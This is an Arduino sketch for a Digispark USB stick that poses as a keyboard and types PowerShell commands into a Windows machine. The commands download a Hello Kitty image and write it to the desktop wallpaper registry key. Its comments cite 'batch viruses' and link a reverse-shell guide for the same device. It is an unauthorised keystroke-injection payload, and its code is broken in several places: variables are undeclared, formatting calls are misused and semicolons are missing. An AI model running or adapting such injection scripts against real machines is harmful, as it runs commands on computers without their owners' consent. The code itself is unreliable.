#include <DigiKeyboard.h>

/*
Beerware license
based on older batch viruses n other stuff

Working on Windows based systems with powershell

links:
https://nox-sec.de/2017/02/08/reverse-shell-digispark-instead-of-rubber-ducky/

*/ 

/* some vars  */

url = "https://images.duckduckgo.com/iu/?u=http%3A%2F%2Fimages1.fanpop.com%2Fimages%2Fphotos%2F2300000%2FHello-Kitty-hello-kitty-2359038-1024-768.jpg&amp;f=1";

//ps commands
c1 = "";
c2 = "";

void setup(){
//change background to hellokitty
  pinMode(1, OUTPUT);
  digitalWrite(1, HIGH);
  DigiKeyboard.println("powershell");
  DigiKeyboard.println("$url = %s", url);
  delay(50);

  // get it
  DigiKeyboard.println("$result = Invoke-WebRequest -Uri $url");
  DigiKeyboard.println("powershell.exe Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $result.content")

//indicate that stuff is on
  digitalWrite(1, LOW);
}

void loop(){
  delay(500)
}
